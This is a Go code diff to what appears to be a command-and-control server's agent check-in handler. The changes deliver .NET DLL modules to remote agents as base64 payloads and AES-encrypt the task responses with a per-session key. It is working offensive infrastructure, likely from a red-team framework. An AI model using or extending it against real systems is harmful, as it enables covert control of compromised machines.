@@ -121,7 +121,7 @@ func (cc *CheckInController) Checkin(ctx *gin.Context) {
 	switch c2request.Reason {
 	case models.Task:
 		logger.Info(LogLevel, LogDetail, fmt.Sprintf("Handling task request for agent %s", c2request.AgentID))
-		cc.handleTaskRequest(ctx, c2request)
+		cc.handleTaskRequest(ctx, c2request, sessionToken)
 		return
 	case models.Response:
 		logger.Info(LogLevel, LogDetail, fmt.Sprintf("Handling response request for agent %s", c2request.AgentID))
@@ -182,7 +182,7 @@ func (cc *CheckInController) authenticate(ctx *gin.Context, c2request models.C2R
 	})
 }
 
-func (cc *CheckInController) handleTaskRequest(ctx *gin.Context, c2request models.C2Request) {
+func (cc *CheckInController) handleTaskRequest(ctx *gin.Context, c2request models.C2Request, sessionToken string) {
 	tasks, err := cc.agentDAL.GetAgentTasks(ctx, c2request.AgentID)
 	if err != nil {
 		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to get tasks for agent %s: %v", c2request.AgentID, err))
@@ -191,54 +191,56 @@ func (cc *CheckInController) handleTaskRequest(ctx *gin.Context, c2request model
 	}
 
 	for i, task := range tasks {
-		moduleDirPath := filepath.Join(conf.GetModuleUploadPath(), task.Module)
-		moduleName := task.Command.Name
+		if task.Type == models.ModuleCommand && task.Status != models.TaskComplete {
+			moduleDirPath := filepath.Join(conf.GetModuleUploadPath(), task.Module)
+			moduleName := task.Command.Name
 
-		modulePath := filepath.Join(moduleDirPath, moduleName)
-		mainModuleBytes, err := utils.LoadAssembly(filepath.Join(modulePath, moduleName+".dll"))
-		if err != nil {
-			logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to load main module: %v", err))
-			ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to load main module: %s", err.Error())})
-			return
-		}
-
-		loadingModulePath := moduleDirPath + "/" + moduleName + "/"
-		dependencyBytes := make(map[string][]byte)
-		files, err := os.ReadDir(loadingModulePath)
-		if err != nil {
-			logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to read module directory: %v", err))
-			ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to read module directory: %s", err.Error())})
-			return
-		}
-
-		for _, file := range files {
-			if file.Name() != moduleName+".dll" && strings.HasSuffix(file.Name(), ".dll") {
-				depBytes, err := utils.LoadAssembly(filepath.Join(loadingModulePath, file.Name()))
-				if err != nil {
-					logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to load dependency: %v", err))
-					ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to load dependency: %s", err.Error())})
-					return
-				}
-				dependencyBytes[file.Name()] = depBytes
+			modulePath := filepath.Join(moduleDirPath, moduleName)
+			mainModuleBytes, err := utils.LoadAssembly(filepath.Join(modulePath, moduleName+".dll"))
+			if err != nil {
+				logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to load main module: %v", err))
+				ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to load main module: %s", err.Error())})
+				return
 			}
+
+			loadingModulePath := moduleDirPath + "/" + moduleName + "/"
+			dependencyBytes := make(map[string][]byte)
+			files, err := os.ReadDir(loadingModulePath)
+			if err != nil {
+				logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to read module directory: %v", err))
+				ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to read module directory: %s", err.Error())})
+				return
+			}
+
+			for _, file := range files {
+				if file.Name() != moduleName+".dll" && strings.HasSuffix(file.Name(), ".dll") {
+					depBytes, err := utils.LoadAssembly(filepath.Join(loadingModulePath, file.Name()))
+					if err != nil {
+						logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to load dependency: %v", err))
+						ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to load dependency: %s", err.Error())})
+						return
+					}
+					dependencyBytes[file.Name()] = depBytes
+				}
+			}
+
+			moduleBytes := models.ModuleBytes{
+				ModuleBytes:     mainModuleBytes,
+				DependencyBytes: dependencyBytes,
+			}
+
+			moduleBytesJSON, err := json.Marshal(moduleBytes)
+			if err != nil {
+				logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to marshal module bytes: %v", err))
+				ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to marshal module bytes: %s", err.Error())})
+				return
+			}
+
+			task.Module = base64.StdEncoding.EncodeToString(moduleBytesJSON)
+			tasks[i] = task
 		}
 
-		moduleBytes := models.ModuleBytes{
-			ModuleBytes:     mainModuleBytes,
-			DependencyBytes: dependencyBytes,
-		}
-
-		moduleBytesJSON, err := json.Marshal(moduleBytes)
-		if err != nil {
-			logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to marshal module bytes: %v", err))
-			ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to marshal module bytes: %s", err.Error())})
-			return
-		}
-
-		task.Module = base64.StdEncoding.EncodeToString(moduleBytesJSON)
-		tasks[i] = task
 	}
-
 	// Update the agent's last callback time
 	lastCallback := time.Now().Format(time.RFC3339)
 	if err := cc.agentDAL.UpdateAgentLastCallback(ctx.Request.Context(), c2request.AgentID, lastCallback); err != nil {
@@ -258,7 +260,27 @@ func (cc *CheckInController) handleTaskRequest(ctx *gin.Context, c2request model
 	c2response.AgentID = c2request.AgentID
 	c2response.Reason = models.Task
 	c2response.Message = string(tasksJSON)
-	ctx.JSON(http.StatusOK, c2response)
+
+	key, exists := KeyRegistry.getKey(sessionToken)
+	if !exists {
+		ctx.JSON(http.StatusUnauthorized, gin.H{"error": "invalid session token"})
+		return
+	}
+
+	responseBytes, err := json.Marshal(c2response)
+	if err != nil {
+		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to marshal response: %v", err))
+		ctx.JSON(http.StatusInternalServerError, gin.H{"error": "failed to marshal response"})
+		return
+	}
+
+	encryptedC2Response, err := utils.AesEncrypt(key, responseBytes)
+	if err != nil {
+		ctx.JSON(http.StatusInternalServerError, gin.H{"error": "failed to encrypt response"})
+		return
+	}
+
+	ctx.JSON(http.StatusOK, gin.H{"message": encryptedC2Response})
 }
 
 func (cc *CheckInController) handleResponseRequest(ctx *gin.Context, c2request models.C2Request) {
@@ -318,5 +340,5 @@ func (cc *CheckInController) handleRegisterRequest(ctx *gin.Context, c2request m
 		return
 	}
 
-	ctx.JSON(http.StatusCreated, gin.H{"agent": newAgent})
+	ctx.JSON(http.StatusCreated, gin.H{})
 }
